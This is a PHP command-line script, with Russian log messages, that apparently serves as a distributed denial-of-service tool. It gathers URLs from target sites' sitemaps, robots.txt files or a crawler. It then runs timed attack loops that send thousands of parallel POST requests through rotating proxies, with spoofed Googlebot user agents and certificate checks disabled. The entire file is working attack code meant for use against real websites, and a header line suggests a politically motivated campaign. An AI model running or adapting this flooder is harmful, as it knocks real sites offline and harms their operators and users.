<?php

if (php_sapi_name() !== 'cli'){
	die('CLI ONLY');
}

ini_set('memory_limit', '8G');

//SETTINGS
$urlLimit 				= 2000;

$timeLimit 				= 72000;
$curlLimit 				= 5000;
$curlTimeout 			= 5;
$curlConnectTimeout 	= 10;

function shuffle_assoc(&$array) {
	$keys = array_keys($array);

	shuffle($keys);
	$new = [];

	foreach($keys as $key) {
		$new[$key] = $array[$key];
	}

	$array = $new;

	return true;
}

require_once(dirname(__FILE__) . '/vendor/autoload.php');

$logger = new \Wa72\SimpleLogger\EchoLogger;
$timer 	= new \Ayesh\PHP_Timer\Timer;

$targets = file(dirname(__FILE__) . '/targets.txt', FILE_IGNORE_NEW_LINES && FILE_SKIP_EMPTY_LINES);
$proxies = file(dirname(__FILE__) . '/proxies.txt', FILE_IGNORE_NEW_LINES && FILE_SKIP_EMPTY_LINES);

$logger->log(\Psr\Log\LogLevel::INFO, 'Поехали, целей: ' . count($targets));

$proxy = explode(':', $proxies[mt_rand(0, count($proxies) - 1)]);
$proxy[3] = trim(str_replace(PHP_EOL, '', $proxy[3]));
$proxy = 'https://' . $proxy[2] . ':' . $proxy[3] . '@' . $proxy[1] . ':' . $proxy[1];


foreach ($targets as $target){
	$target = trim(str_replace(PHP_EOL, '', $target));
	$file = dirname(__FILE__) . '/targets/' . $target . '.txt';

	$logger->log(\Psr\Log\LogLevel::INFO, 'Цель: ' . $target);

	if (!file_exists($file)){

		//создадим сразу, если что-то пойдет не так, в следующий раз просто пропустим
		touch($file);

		$logger->log(\Psr\Log\LogLevel::INFO, 'Файл с урлами не существует, сканируем: ' . $target);

		//Stage 1, sitemap.xml
		$links = [];
		try {	
			$logger->log(\Psr\Log\LogLevel::INFO, 'Пробуем sitemap.txt: ' . $target);
			$sitemapParser = new \vipnytt\SitemapParser('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)', 
				['guzzle' => ['track_redirects' => true, 'verify' => false, 'proxy' => $proxy]]);
			$sitemapParser->parseRecursive('https://' . $target . '/' . 'sitemap.xml');

			if ($urls = $sitemapParser->getURLs()){
				shuffle_assoc($urls);

				foreach (array_slice($urls, 0, $urlLimit) as $url => $tags) {
					$links[] = $url;				
				}
			}
		}	catch (\vipnytt\SitemapParser\Exceptions\SitemapParserException $e) {
			echo $e->getMessage(); echo PHP_EOL;
		}

		//Stage 2, robots.txt with sitemap
		if (!$links){
			try {			
				$logger->log(\Psr\Log\LogLevel::INFO, 'Пробуем robots.txt: ' . $target);
				$sitemapParser->parseRecursive('https://' . $target . '/' . 'robots.txt', ['guzzle' => ['track_redirects' => true, 'verify' => false]]);

				if ($urls = $sitemapParser->getURLs()){
					$urls = $sitemapParser->getURLs();
					shuffle_assoc($urls);

					foreach (array_slice($urls, 0, $urlLimit) as $url => $tags) {
						$links[] = $url;				
					}
				}

			}	catch (\vipnytt\SitemapParser\Exceptions\SitemapParserException $e) {
				echo $e->getMessage(); echo PHP_EOL;
			}

		}

		if (!$links){
		//Stage 3, try Crawler
			$crawler = new \Arachnid\Crawler('https://' . $target, 1);
			$crawler->setLogger($logger)->traverse();
			$urls = $crawler->getLinksArray();

			$links = [];
			foreach ($urls as $key => $value){
				if (!$value['isExternal'] && $value['status'] == 'OK'){
					$links[] = $key;
				}
			}
		}	

		$linksTXT = '';
		foreach ($links as $link){
			$linksTXT .= (trim($link) . PHP_EOL);
		}
		

		file_put_contents($file, $linksTXT);
		unset($links);
		unset($linksTXT);
	}
}

$targetURLS = [];
foreach ($targets as $target){
	$target = trim(str_replace(PHP_EOL, '', $target));
	$targetURLS = array_merge($targetURLS, file(dirname(__FILE__) . '/targets/' . $target . '.txt', FILE_IGNORE_NEW_LINES && FILE_SKIP_EMPTY_LINES));
}

shuffle($targetURLS);

$curlHeadersDefault		= [			
	'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
	'Accept-Encoding: gzip,deflate',
	'Cache-Control: no-cache',
	'Pragma: no-cache',
	'Russian-Warship: fuck you'
];
$curlUA					= [
	'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
	'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_1 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8B117 Safari/6531.22.7 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)',
	'SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)',
	'DoCoMo/2.0 N905i(c100;TB;W24H16) (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)',
	'Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)',
	'Mozilla/5.0 (iPhone; U; CPU iPhone OS) (compatible; Googlebot-Mobile/2.1; http://www.google.com/bot.html)'
];

$logger->log(\Psr\Log\LogLevel::INFO, 'Всего URL: ' . count($targetURLS));

$total = count($targetURLS);
$iterations = ceil($total/$curlLimit);

$curlOptionsDefault = [                 
	CURLOPT_HEADER         			=> true,
	CURLOPT_FOLLOWLOCATION 			=> false,
	CURLOPT_SSL_VERIFYPEER 			=> false,
	CURLOPT_SSL_VERIFYHOST			=> false,
	CURLOPT_TIMEOUT        			=> $curlTimeout,
	CURLOPT_CONNECTTIMEOUT 			=> $curlConnectTimeout,
	CURLOPT_RETURNTRANSFER 			=> true,
	CURLOPT_VERBOSE 	   			=> false,
	CURLOPT_HTTPPROXYTUNNEL			=> false,
	CURLOPT_HTTP_VERSION			=> CURL_HTTP_VERSION_1_1
];




$timer::start('atcks');
$a = 1;
while($timer::read('atcks', $timer::FORMAT_SECONDS) <= $timeLimit){
	$timer::start('atck');
	$logger->log(\Psr\Log\LogLevel::INFO, 'Атака ' . $a);

	for ($i = 1; $i <= $iterations; $i++){
		//REREAD PROXIES TO UPDATE
		$proxies = file(dirname(__FILE__) . '/proxies.txt', FILE_IGNORE_NEW_LINES && FILE_SKIP_EMPTY_LINES);

		$logger->log(\Psr\Log\LogLevel::INFO, 'Итерация ' . $i . ', ip с ' . ($curlLimit * ($i-1)) . ' по ' . ($curlLimit * $i));
		$slice = array_slice($targetURLS, $curlLimit * ($i-1), $curlLimit);

		$multiCurl 	= curl_multi_init();
		$curls 		= [];

		$c = 0;
		foreach ($slice as $targetURL){
			$targetURL = trim(str_replace(PHP_EOL, '', $targetURL));

			$curls[$c] = curl_init();

			$curlOptions = $curlOptionsDefault;
			$curlHeaders = $curlHeadersDefault;			

			//PROXY
			$proxy = explode(':', $proxies[mt_rand(0, count($proxies) - 1)]);
			$proxy[3] = trim(str_replace(PHP_EOL, '', $proxy[3]));
			$curlOptions[CURLOPT_PROXY] 		= $proxy[0] . ':' . $proxy[1];
			$curlOptions[CURLOPT_PROXYTYPE] 	= CURLPROXY_HTTP;
			$curlOptions[CURLOPT_PROXYAUTH] 	= CURLAUTH_BASIC;
			$curlOptions[CURLOPT_PROXYUSERPWD] 	= $proxy[2] . ':' . $proxy[3];


			//HEADERS
			$host 		= parse_url($targetURL, PHP_URL_HOST);
			$referer 	= parse_url($targetURL, PHP_URL_SCHEME) . '://' . parse_url($targetURL, PHP_URL_HOST);
			$curlHeaders[] = 'Host: ' . $host;
			$curlHeaders[] = 'Referer: ' . $referer;
			$curlOptions[CURLOPT_HTTPHEADER] 	= $curlHeaders;
			$curlOptions[CURLOPT_REFERER] 		= $referer;
			$curlOptions[CURLOPT_USERAGENT]		= \Campo\UserAgent::random();
			$curlOptions[CURLOPT_URL]		 	= trim($targetURL);

			//?don't know
			$curlOptions[CURLOPT_POSTFIELDS]	= file_get_contents(dirname(__FILE__) . '/output.txt');

			curl_setopt_array($curls[$c], $curlOptions);
			curl_multi_add_handle($multiCurl, $curls[$c]);

			$c++;
		}

		do {
			$status = curl_multi_exec($multiCurl, $active);
			if ($active) {        
				curl_multi_select($multiCurl);
			}
		} while ($active && $status == CURLM_OK);


		$results = [];
		foreach($curls as $curlID => $curl)
		{
			$r_host = parse_url($slice[$curlID], PHP_URL_HOST);
			$r_code = curl_getinfo($curl,  CURLINFO_HTTP_CODE);

			if (empty($results[$r_host])){
				$results[$r_host] = [];
			}

			if (empty($results[$r_host][$r_code])){
				$results[$r_host][$r_code] = 0;				
			}

			$results[$r_host][$r_code] ++;

		//	$log = parse_url($slice[$curlID], PHP_URL_HOST) . ': ' . curl_getinfo($curl,  CURLINFO_HTTP_CODE);
		//	$logger->log(\Psr\Log\LogLevel::INFO, $log);
		}

		foreach ($results as $host => $codes){
			foreach ($codes as $code => $quantity){
				$logger->log(\Psr\Log\LogLevel::INFO, ($host . ' ' . $code . ' => ' . $quantity . ' times!'));
			}

		}

		unset($curls);
		unset($multiCurl);
	}

	$logger->log(\Psr\Log\LogLevel::INFO, 'Работаем уже ' . $timer::read('atcks', $timer::FORMAT_SECONDS) .' сек');
	$timer::stop('atck');
	$a++;


}
$timer::stop('atcks');